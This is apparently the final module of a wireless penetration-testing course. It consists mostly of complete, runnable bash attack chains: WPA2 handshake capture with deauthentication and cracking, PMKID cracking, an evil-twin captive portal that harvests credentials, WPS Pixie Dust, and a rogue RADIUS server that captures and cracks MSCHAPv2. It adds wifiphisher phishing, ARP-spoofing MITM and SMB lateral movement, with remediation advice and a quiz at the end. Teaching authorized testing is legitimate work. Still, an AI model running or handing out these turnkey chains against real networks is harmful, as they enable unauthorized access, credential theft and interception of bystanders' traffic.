# Module 14 — Full Attack Chains & Automation

> **Prerequisites:** All previous modules (00–13)
> **This is the final module.**

> **Legal Disclaimer:** The techniques in this module combine every attack covered in this course into complete, end-to-end chains. They must only be performed on networks and systems you own or have **explicit written authorization** to test. Unauthorized use constitutes serious criminal offences in all jurisdictions.

---

## Table of Contents

1. [Attack Chain Methodology](#1-attack-chain-methodology)
2. [Chain 1 — Recon → Deauth → Handshake → Crack](#2-chain-1--recon--deauth--handshake--crack)
3. [Chain 2 — PMKID Clientless Crack Pipeline](#3-chain-2--pmkid-clientless-crack-pipeline)
4. [Chain 3 — Evil Twin + Captive Portal](#4-chain-3--evil-twin--captive-portal)
5. [Chain 4 — WPS Pixie Dust Fast Compromise](#5-chain-4--wps-pixie-dust-fast-compromise)
6. [Chain 5 — Enterprise Rogue RADIUS Full Chain](#6-chain-5--enterprise-rogue-radius-full-chain)
7. [Bash Automation Harness](#7-bash-automation-harness)
8. [wifiphisher Automated Framework](#8-wifiphisher-automated-framework)
9. [Post-Exploitation on Wireless Clients](#9-post-exploitation-on-wireless-clients)
10. [Reporting & Remediation Guidance](#10-reporting--remediation-guidance)
11. [Knowledge Check](#11-knowledge-check)

---

## 1. Attack Chain Methodology

### The Penetration Testing Lifecycle for Wireless

Every wireless engagement follows the same structured lifecycle:

```
┌─────────────────────────────────────────────────────────────────┐
│  1. RECON        2. SCAN         3. EXPLOIT       4. POST-EXPLOIT│
│                                                                   │
│  airodump-ng  →  wash / hcx  →  reaver / crack  →  pivot / MITM │
│  Identify APs    Fingerprint     Gain access       Harvest data  │
└─────────────────────────────────────────────────────────────────┘
```

### Attack Selection Decision Tree

```
Target AP identified
│
├── WPS enabled? (wash)
│   ├── Yes, unlocked → Pixie Dust first (Chain 4)
│   └── No / locked → continue
│
├── Clients connected?
│   ├── Yes → Deauth + Handshake capture (Chain 1)
│   └── No  → PMKID clientless capture (Chain 2)
│
├── WPA2-Enterprise (802.1X)?
│   └── Yes → Rogue RADIUS (Chain 5)
│
└── Want credentials beyond Wi-Fi access?
    └── Evil Twin + Captive Portal (Chain 3)
```

### Lab Environment Setup

All chains assume:
- **wlan0** — monitor/packet injection adapter
- **wlan1** — second adapter for AP/evil-twin work
- **eth0** — internet uplink for NAT forwarding
- Kali Linux 2024+ with all tools installed

```bash
# Quick toolchain verification
sudo apt install -y aircrack-ng hashcat hcxdumptool hcxtools \
  reaver bully hostapd hostapd-wpe dnsmasq nginx php-fpm \
  bettercap wifiphisher asleap pixiewps

# Verify all adapters visible
iw dev
```

---

## 2. Chain 1 — Recon → Deauth → Handshake → Crack

**Goal:** Recover WPA2-PSK passphrase from a network with connected clients.
**Modules:** 03 → 06 → 08 → 07

### Full Script

```bash
#!/bin/bash
# chain1_handshake.sh — WPA2 Handshake Capture + Crack
set -euo pipefail

IFACE="wlan0"
MON="${IFACE}mon"
OUTPUT_DIR="/tmp/chain1"
WORDLIST="/usr/share/wordlists/rockyou.txt"

mkdir -p "$OUTPUT_DIR"

echo "[*] Starting monitor mode..."
sudo airmon-ng check kill
sudo airmon-ng start "$IFACE"

echo "[*] Scanning for targets (15 seconds)..."
sudo timeout 15 airodump-ng "$MON" \
  --output-format csv -w "$OUTPUT_DIR/scan" 2>/dev/null || true

echo ""
read -rp "[?] Enter target BSSID: " BSSID
read -rp "[?] Enter target channel: " CHANNEL
read -rp "[?] Enter SSID: " SSID

echo "[*] Locking to channel $CHANNEL, capturing handshake..."
sudo airodump-ng "$MON" \
  --bssid "$BSSID" -c "$CHANNEL" \
  -w "$OUTPUT_DIR/capture" &
AIRODUMP_PID=$!

sleep 5

echo "[*] Sending deauth frames to force reconnection..."
sudo aireplay-ng --deauth 10 -a "$BSSID" "$MON"

echo "[*] Waiting for handshake (30 seconds)..."
sleep 30

kill $AIRODUMP_PID 2>/dev/null || true

# Verify handshake
if sudo aircrack-ng "$OUTPUT_DIR/capture-01.cap" 2>&1 | grep -q "handshake"; then
    echo "[+] Handshake captured!"
else
    echo "[!] Handshake not confirmed — try again or run manually."
fi

echo "[*] Converting to hcxpcapngtool format..."
hcxpcapngtool -o "$OUTPUT_DIR/hashes.hc22000" "$OUTPUT_DIR/capture-01.cap" 2>/dev/null || true

echo "[*] Cracking with hashcat..."
hashcat -m 22000 "$OUTPUT_DIR/hashes.hc22000" "$WORDLIST" \
  --status --status-timer=10 \
  -o "$OUTPUT_DIR/cracked.txt"

echo ""
if [[ -f "$OUTPUT_DIR/cracked.txt" ]]; then
    echo "[+] CRACKED:"
    cat "$OUTPUT_DIR/cracked.txt"
else
    echo "[-] Not found in wordlist. Try rules: hashcat -m 22000 ... -r rules/best64.rule"
fi

sudo airmon-ng stop "$MON"
sudo systemctl start NetworkManager
```

---

## 3. Chain 2 — PMKID Clientless Crack Pipeline

**Goal:** Recover WPA2-PSK passphrase with no clients present.
**Modules:** 12 → 07

```bash
#!/bin/bash
# chain2_pmkid.sh — Clientless PMKID capture + crack
set -euo pipefail

IFACE="wlan0"
OUTPUT_DIR="/tmp/chain2"
WORDLIST="/usr/share/wordlists/rockyou.txt"
CAPTURE_SECONDS=60

mkdir -p "$OUTPUT_DIR"

echo "[*] Stopping NetworkManager..."
sudo systemctl stop NetworkManager wpa_supplicant

echo "[*] Capturing PMKIDs for ${CAPTURE_SECONDS}s..."
sudo timeout "$CAPTURE_SECONDS" hcxdumptool \
  -i "$IFACE" \
  -o "$OUTPUT_DIR/capture.pcapng" \
  --enable_status=3 2>&1 | grep -E "FOUND|ERROR" || true

echo "[*] Restarting NetworkManager..."
sudo systemctl start NetworkManager

echo "[*] Converting capture..."
hcxpcapngtool -o "$OUTPUT_DIR/hashes.hc22000" "$OUTPUT_DIR/capture.pcapng"

HASH_COUNT=$(wc -l < "$OUTPUT_DIR/hashes.hc22000" 2>/dev/null || echo 0)
echo "[+] Extracted $HASH_COUNT hashes"

if [[ "$HASH_COUNT" -eq 0 ]]; then
    echo "[-] No hashes captured. Try targeted mode with --filterlist_ap."
    exit 1
fi

echo "[*] Cracking (dictionary + best64 rules)..."
hashcat -m 22000 "$OUTPUT_DIR/hashes.hc22000" "$WORDLIST" \
  -r /usr/share/hashcat/rules/best64.rule \
  -o "$OUTPUT_DIR/cracked.txt" \
  --status --status-timer=30

echo ""
if [[ -f "$OUTPUT_DIR/cracked.txt" ]]; then
    echo "[+] CRACKED:"
    cat "$OUTPUT_DIR/cracked.txt"
fi
```

---

## 4. Chain 3 — Evil Twin + Captive Portal

**Goal:** Capture plaintext credentials (Wi-Fi password or user logins) via social engineering.
**Modules:** 09 → 10 → 08

```bash
#!/bin/bash
# chain3_evil_twin_portal.sh — Full evil twin + credential portal
set -euo pipefail

IFACE_AP="wlan1"     # AP interface
IFACE_MON="wlan0mon" # Monitor/deauth interface
AP_IP="10.0.0.1"
SSID="${1:-FreeWifi}"
CHANNEL="${2:-6}"

echo "[*] Setting up evil twin: SSID=$SSID CH=$CHANNEL"

# --- 1. Configure AP interface IP ---
sudo ip addr flush dev "$IFACE_AP" 2>/dev/null || true
sudo ip addr add "${AP_IP}/24" dev "$IFACE_AP"
sudo ip link set "$IFACE_AP" up

# --- 2. Start hostapd ---
cat > /tmp/evil-twin.conf << EOF
interface=${IFACE_AP}
driver=nl80211
ssid=${SSID}
hw_mode=g
channel=${CHANNEL}
auth_algs=1
wpa=0
beacon_int=100
EOF

sudo hostapd /tmp/evil-twin.conf &
HOSTAPD_PID=$!
sleep 2

# --- 3. DNS wildcard hijack + DHCP ---
cat > /tmp/dnsmasq_portal.conf << EOF
interface=${IFACE_AP}
no-resolv
address=/#/${AP_IP}
dhcp-range=10.0.0.10,10.0.0.100,1h
dhcp-option=3,${AP_IP}
dhcp-option=6,${AP_IP}
log-queries
log-facility=/var/log/portal_dns.log
EOF

sudo dnsmasq -C /tmp/dnsmasq_portal.conf --no-daemon &
DNSMASQ_PID=$!

# --- 4. iptables redirect all HTTP to nginx ---
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null
sudo iptables -t nat -A PREROUTING -i "$IFACE_AP" -p tcp --dport 80  -j REDIRECT --to-port 80
sudo iptables -t nat -A PREROUTING -i "$IFACE_AP" -p tcp --dport 443 -j REDIRECT --to-port 443

# --- 5. Start nginx ---
sudo systemctl start nginx php8.1-fpm

echo "[+] Evil twin active. Monitoring credentials..."
echo "    Logs: /var/log/harvested.log"
echo "    Press Ctrl+C to stop."

# --- 6. Deauth legitimate AP in background ---
if [[ -n "${3:-}" ]]; then
    echo "[*] Deauthing real AP: $3"
    sudo aireplay-ng --deauth 0 -a "$3" "$IFACE_MON" &
    DEAUTH_PID=$!
fi

# Watch for credentials
sudo tail -f /var/log/harvested.log 2>/dev/null

# Cleanup on exit
trap "kill $HOSTAPD_PID $DNSMASQ_PID ${DEAUTH_PID:-} 2>/dev/null; \
      sudo iptables -t nat -F; \
      sudo systemctl stop NetworkManager; \
      sudo systemctl start NetworkManager" EXIT
```

---

## 5. Chain 4 — WPS Pixie Dust Fast Compromise

**Goal:** Compromise a WPA2-PSK network in under 30 seconds using WPS Pixie Dust.
**Modules:** 11

```bash
#!/bin/bash
# chain4_wps_pixiedust.sh — WPS scan + Pixie Dust attempt
set -euo pipefail

IFACE="wlan0"
MON="${IFACE}mon"
OUTPUT_DIR="/tmp/chain4"

mkdir -p "$OUTPUT_DIR"

sudo airmon-ng check kill
sudo airmon-ng start "$IFACE"

echo "[*] Scanning for WPS-enabled APs (20 seconds)..."
sudo timeout 20 wash -i "$MON" 2>/dev/null | tee "$OUTPUT_DIR/wps_scan.txt" || true

echo ""
cat "$OUTPUT_DIR/wps_scan.txt"
echo ""

read -rp "[?] Enter target BSSID (unlocked APs only): " BSSID
read -rp "[?] Enter channel: " CHANNEL

echo "[*] Attempting Pixie Dust attack..."
sudo reaver \
  -i "$MON" \
  -b "$BSSID" \
  -c "$CHANNEL" \
  -K 1 \
  -S \
  -vv \
  2>&1 | tee "$OUTPUT_DIR/reaver_output.txt"

# Extract results
PIN=$(grep -oP "WPS PIN: '\K[^']+" "$OUTPUT_DIR/reaver_output.txt" || echo "")
PSK=$(grep -oP "WPA PSK: '\K[^']+" "$OUTPUT_DIR/reaver_output.txt" || echo "")

echo ""
if [[ -n "$PSK" ]]; then
    echo "[+] SUCCESS!"
    echo "    PIN: $PIN"
    echo "    PSK: $PSK"
else
    echo "[-] Pixie Dust failed. Trying PIN bruteforce (slow)..."
    sudo reaver -i "$MON" -b "$BSSID" -c "$CHANNEL" -d 2 -r 3:60 -vv
fi

sudo airmon-ng stop "$MON"
sudo systemctl start NetworkManager
```

---

## 6. Chain 5 — Enterprise Rogue RADIUS Full Chain

**Goal:** Capture and crack WPA2-Enterprise MSCHAPv2 credentials.
**Modules:** 09 → 13

```bash
#!/bin/bash
# chain5_enterprise.sh — Rogue RADIUS + MSCHAPv2 crack
set -euo pipefail

IFACE_AP="wlan1"
IFACE_MON="wlan0mon"
SSID="${1:-CorpWiFi}"
CHANNEL="${2:-6}"
WORDLIST="/usr/share/wordlists/rockyou.txt"
LOG="/var/log/hostapd-wpe.log"

echo "[*] Generating certificates..."
cd /etc/hostapd-wpe/certs && sudo bash bootstrap > /dev/null 2>&1

echo "[*] Starting rogue WPA2-Enterprise AP: SSID=$SSID"

cat > /tmp/corp-evil.conf << EOF
interface=${IFACE_AP}
driver=nl80211
ssid=${SSID}
hw_mode=g
channel=${CHANNEL}
auth_algs=3
wpa=2
wpa_key_mgmt=WPA-EAP
rsn_pairwise=CCMP
ieee8021x=1
eap_server=1
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
private_key_passwd=whatever
hostapd_wpe_log_file=${LOG}
EOF

sudo hostapd-wpe /tmp/corp-evil.conf &
HOSTAPD_PID=$!

echo "[+] Rogue AP running. Monitoring for credentials..."
echo "    Log: $LOG"

# Watch log and auto-crack as credentials arrive
sudo tail -f "$LOG" 2>/dev/null | while IFS= read -r line; do
    echo "$line"
    if echo "$line" | grep -q "response:"; then
        echo ""
        echo "[*] MSCHAPv2 captured — extracting for hashcat..."
        # Parse and crack (simplified — use hostapd-wpe-joiner in practice)
        CHALLENGE=$(grep -oP "challenge: \K[0-9a-f:]+" "$LOG" | tail -1 | tr -d ':')
        RESPONSE=$(grep -oP "response: \K[0-9a-f:]+" "$LOG" | tail -1 | tr -d ':')
        USER=$(grep -oP "username: \K\S+" "$LOG" | tail -1)

        echo "   User: $USER"
        echo "   Cracking with asleap..."
        asleap -C "$CHALLENGE" -R "$RESPONSE" -W "$WORDLIST" 2>/dev/null || \
            echo "   Not in wordlist — try rules: hashcat -m 5600 ..."
    fi
done

trap "kill $HOSTAPD_PID 2>/dev/null" EXIT
```

---

## 7. Bash Automation Harness

### Master Recon Script

```bash
#!/bin/bash
# recon_all.sh — comprehensive wireless recon dump
IFACE="wlan0mon"
OUT="/tmp/recon_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUT"

echo "[*] Starting comprehensive wireless recon..."

# Parallel: airodump + wash
sudo airodump-ng "$IFACE" \
  --output-format csv,kismet,pcap \
  -w "$OUT/airodump" &
AIRODUMP_PID=$!

sudo wash -i "$IFACE" 2>/dev/null > "$OUT/wps_scan.txt" &
WASH_PID=$!

# Capture for 60 seconds
sleep 60
kill $AIRODUMP_PID $WASH_PID 2>/dev/null

# Summary report
echo ""
echo "=== SCAN RESULTS ==="
echo "--- WPA2/WPA3 Networks ---"
awk -F',' 'NR>2 && NF>14 && $6~/WPA|WPA2|WPA3/ {
    printf "BSSID: %-20s CH: %-4s ENC: %-10s SSID: %s\n",
    $1,$4,$6,$14}' "$OUT/airodump-01.csv" | head -20

echo ""
echo "--- WPS Enabled ---"
cat "$OUT/wps_scan.txt" | grep -v "^$" | head -20

echo ""
echo "Capture files: $OUT/"
```

### Automated Attack Selector

```bash
#!/bin/bash
# auto_attack.sh — decision tree attack selector
TARGET_BSSID="$1"
TARGET_CHANNEL="$2"
MON_IFACE="wlan0mon"

if [[ -z "$TARGET_BSSID" ]]; then
    echo "Usage: $0 <BSSID> <channel>"
    exit 1
fi

echo "[*] Analyzing target: $TARGET_BSSID on channel $TARGET_CHANNEL"

# Check WPS
WPS_STATUS=$(sudo wash -i "$MON_IFACE" -c "$TARGET_CHANNEL" 2>/dev/null | \
             grep -i "$TARGET_BSSID" | awk '{print $4, $5}')

if echo "$WPS_STATUS" | grep -q "2\.0\|1\.0" && ! echo "$WPS_STATUS" | grep -q "Yes"; then
    echo "[+] WPS enabled and unlocked — running Pixie Dust"
    bash chain4_wps_pixiedust.sh "$TARGET_BSSID" "$TARGET_CHANNEL"
    exit 0
fi

# Check for clients
CLIENT_COUNT=$(sudo timeout 10 airodump-ng "$MON_IFACE" \
  --bssid "$TARGET_BSSID" -c "$TARGET_CHANNEL" \
  --output-format csv -w /tmp/check 2>/dev/null | \
  grep -c "$TARGET_BSSID" || echo 0)

if [[ "$CLIENT_COUNT" -gt 0 ]]; then
    echo "[+] Clients detected — running handshake capture (Chain 1)"
    bash chain1_handshake.sh "$TARGET_BSSID" "$TARGET_CHANNEL"
else
    echo "[+] No clients — running PMKID capture (Chain 2)"
    bash chain2_pmkid.sh
fi
```

---

## 8. wifiphisher Automated Framework

`wifiphisher` automates the evil twin + captive portal pipeline into a single tool with built-in phishing scenarios.

```bash
sudo apt install wifiphisher

# List available phishing scenarios
sudo wifiphisher --list-scenarios

# Full automated attack: evil twin + firmware-upgrade portal
sudo wifiphisher \
  --essid "TargetNetwork" \
  --channel 6 \
  --phishing-scenario firmware-upgrade \
  -kN                             # -kN: deauth all clients from real AP

# Targeted attack — deauth specific BSSID
sudo wifiphisher \
  --essid "TargetNetwork" \
  -aI wlan1 \
  -jI wlan0 \
  --handshake-capture /tmp/handshake.cap \
  --phishing-scenario wifi-connect
```

### Built-in wifiphisher Scenarios

| Scenario | Description | Captures |
|----------|-------------|----------|
| `firmware-upgrade` | Fake router firmware update page | WPA2 PSK |
| `wifi-connect` | Generic Wi-Fi reconnect form | WPA2 PSK |
| `oauth-login` | Fake social login (Facebook/Google) | Username + password |
| `plugin-update` | Fake browser plugin update | Arbitrary file exec |

---

## 9. Post-Exploitation on Wireless Clients

Once connected to a network (via cracked PSK, rogue AP MITM, or enterprise credentials), post-exploitation begins.

### Network Mapping

```bash
# Discover live hosts on the 192.168.1.0/24 segment
sudo nmap -sn 192.168.1.0/24 | grep "Nmap scan"

# Full port scan on interesting hosts
sudo nmap -sV -sC -p- 192.168.1.1 -oN /tmp/nmap_gateway.txt

# Identify OS and services
sudo nmap -A 192.168.1.0/24 --top-ports 100
```

### ARP Spoofing / MITM

```bash
# Intercept all traffic between victim and gateway
sudo bettercap -iface wlan0 -eval \
  "set arp.spoof.targets 192.168.1.50; \
   arp.spoof on; \
   net.sniff on; \
   set http.proxy on; \
   http.proxy on"
```

### Credential Sniffing

```bash
# With bettercap running:
bettercap> events.show
# Shows captured HTTP credentials, cookies, DNS queries

# Or use tcpdump for raw capture
sudo tcpdump -i wlan0 -w /tmp/traffic.pcap &
# Analyze offline with Wireshark
```

### Pivoting via Wireless

```bash
# If you cracked a WPA2 PSK and connected:
# 1. Get your IP
ip addr show wlan0

# 2. Scan the internal network
sudo nmap -sV 192.168.1.0/24

# 3. Look for internal services
# - Web interfaces (port 80/443/8080)
# - SMB shares (port 445)
# - SSH (port 22)
# - RDP (port 3389)

# 4. If enterprise credentials captured — try lateral movement
# e.g. SMB with captured AD credentials:
smbclient -L //192.168.1.10 -U "CORP\\alice%Summer2024!"
```

---

## 10. Reporting & Remediation Guidance

### Penetration Test Report Structure

Every wireless engagement report should include:

```
1. Executive Summary
   - Scope and authorization
   - Critical findings summary
   - Business risk assessment

2. Technical Findings (per vulnerability)
   - BSSID / SSID / network segment
   - Attack vector used
   - Evidence (screenshots, logs, cracked hashes — redacted)
   - CVSS score
   - Remediation recommendation

3. Remediation Recommendations (prioritized)

4. Appendices
   - Raw scan output
   - Tool versions used
   - Full command log
```

### Remediation Priority Matrix

| Finding | Severity | Primary Remediation |
|---------|----------|---------------------|
| WPS enabled | Critical | Disable WPS entirely |
| Weak WPA2 passphrase cracked | Critical | 20+ char random passphrase or WPA3 |
| PEAP without cert validation | Critical | Pin RADIUS CA on all supplicants |
| WPA3 transition mode downgrade | High | WPA3-only mode |
| No 802.11w (MFP) | High | Enable mandatory MFP |
| Deauth-based DoS possible | Medium | Enable 802.11w + WPA3 |
| PMKID exposed | Informational | Mitigated by strong passphrase / WPA3 |

### Scapy Custom Frame Crafting for Reporting PoC

```python
#!/usr/bin/env python3
# poc_deauth.py — Proof-of-concept deauth (for reporting evidence)
from scapy.all import *

def send_deauth_poc(bssid, client, iface="wlan0mon", count=3):
    """Demonstration PoC — sends count deauth frames only."""
    dot11 = Dot11(addr1=client, addr2=bssid, addr3=bssid)
    frame = RadioTap() / dot11 / Dot11Deauth(reason=7)
    sendp(frame, iface=iface, count=count, verbose=True)
    print(f"[PoC] Sent {count} deauth frames — evidence captured.")

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 4:
        print("Usage: poc_deauth.py <bssid> <client> <iface>")
        sys.exit(1)
    send_deauth_poc(sys.argv[1], sys.argv[2], sys.argv[3])
```

---

## 11. Knowledge Check

You have completed the full course. Test your comprehensive understanding:

1. Using the attack decision tree, which chain would you run first against an unlocked WPS 2.0 network — and why?
2. In Chain 1, what is the purpose of converting the `.cap` file with `hcxpcapngtool` before passing it to hashcat?
3. Write the three `iptables` commands required in Chain 3 to redirect all victim HTTP and HTTPS traffic to the attacker's nginx portal.
4. In Chain 5, what values from the `hostapd-wpe` log are passed to `asleap`, and what does each represent?
5. `wifiphisher` with the `firmware-upgrade` scenario captures which credential type, and why is this effective?
6. Explain why a captured MSCHAPv2 hash from Chain 5 is more operationally valuable than a cracked WPA2-PSK from Chain 1.
7. After connecting via a cracked PSK, what tool would you use to perform ARP spoofing and MITM traffic interception, and what two modules need to be enabled in it?
8. A target network uses WPA3-SAE in transition mode. Which chains remain viable and why?
9. In the report structure, what is the difference in purpose between the "Executive Summary" and the "Technical Findings" sections?
10. What is the single most impactful remediation that addresses Chain 1, Chain 2, and also significantly hardens against Chain 3?

---

**Congratulations — you have completed the Wireless Network Exploitation course.**
